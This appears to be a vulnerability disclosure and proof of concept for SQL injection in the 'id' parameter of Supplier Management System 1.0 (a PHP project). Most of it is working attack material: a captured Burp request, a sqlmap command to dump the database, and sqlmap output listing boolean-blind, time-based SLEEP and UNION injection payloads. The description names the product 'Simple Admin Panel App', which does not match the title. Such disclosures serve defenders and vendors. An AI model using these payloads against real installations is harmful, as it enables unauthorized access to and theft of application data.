# Supplier Managment System - SQL Injection
+ **Exploit Title:** Supplier Managment System - SQL Injection
+ **Date:** 2024-02-02
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/supplier-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/6634f114-7a98-4c9a-b8c3-ff5c577378e4
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Simple Admin Panel App 1.0 allows SQL Injection via the 'id' parameter at "/supplier/production/supplier_admin_edit.php?action=Edit&id=8". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/supplier/production"
+ Click on the 'Customer Detaiis' button
+ Then click edit button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /supplier/production/supplier_admin_edit.php?action=Edit&id=8 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: action=Edit&id=8 AND 3751=(SELECT (CASE WHEN (3751=3751) THEN 3751 ELSE (SELECT 6876 UNION SELECT 5132) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=Edit&id=8 AND (SELECT 7637 FROM (SELECT(SLEEP(5)))uBze)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: action=Edit&id=-3162 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a717a71,0x7672556e4e694c5648416a73487959637268546c5155454d7176647a7456446847734a7873617a56,0x716b6b6a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[19:42:36] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:42:36] [INFO] fetching current database
current database: 'supplier'
```
+ current database: `supplier`

![Ekran görüntüsü 2024-02-02 034332](https://github.com/BurakSevben/CVEs/assets/117217689/9e5345ab-996f-4a2e-b6bb-11d381cfd16e)
